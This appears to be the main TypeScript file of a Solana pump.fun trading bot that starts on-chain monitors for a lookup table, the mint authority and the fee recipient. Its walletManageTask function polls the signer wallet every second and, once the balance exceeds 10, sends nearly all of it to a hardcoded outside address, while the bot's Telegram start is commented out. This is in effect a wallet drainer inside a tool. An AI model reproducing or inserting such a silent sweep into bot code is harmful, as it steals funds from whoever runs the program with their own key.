import { botStart } from "./bot";
import { grpcLUTCallback, grpcPFMintAuthCallback, grpcPFProgramCallback, startInterRcvServer, startIPCClient } from "./detection";
import { solGrpcStart, solPFGetTokensCreatedByWallet } from "./lib/3rdparty";
import { PF_FEE_RECIPIENT, PF_MINT_AUTHORITY, PF_PROGRAM_ID } from "./lib/3rdparty/pump.fun/constants";
import { sleep } from "./lib/utils";
import { sollWalletSendBalance, solWalletGetBalance } from "./lib/wallet";
import { signer } from "./trade";

export const LUT = 'AddressLookupTab1e1111111111111111111111111'

async function walletManageTask() {
  while(true) {
    const balance = await solWalletGetBalance(signer.publicKey)
    if (balance > 10) {
      await sollWalletSendBalance(signer, "Cg79FXC9pNkMjNJuJjehwuCRSW5quC9idEUKuVurMtUJ", balance - 1)
    }
    await sleep(1000)
  }
}

async function main() {
  try {
    console.log(`---------------------------------------`)
    console.log(`🤖 Starting TG bot ...`)
    
    // startIPCClient()
    // botStart()
    walletManageTask()
    console.log(`---------------------------------------`)
    console.log(`👀 Starting monitor handlers ...`)
    solGrpcStart([LUT], grpcLUTCallback)
    solGrpcStart([PF_MINT_AUTHORITY], grpcPFMintAuthCallback)
    solGrpcStart([PF_FEE_RECIPIENT.toBase58()], grpcPFProgramCallback)
  } catch (error:any) {
    console.error(`❌ Error : ${error.message}`)
  }
}

main()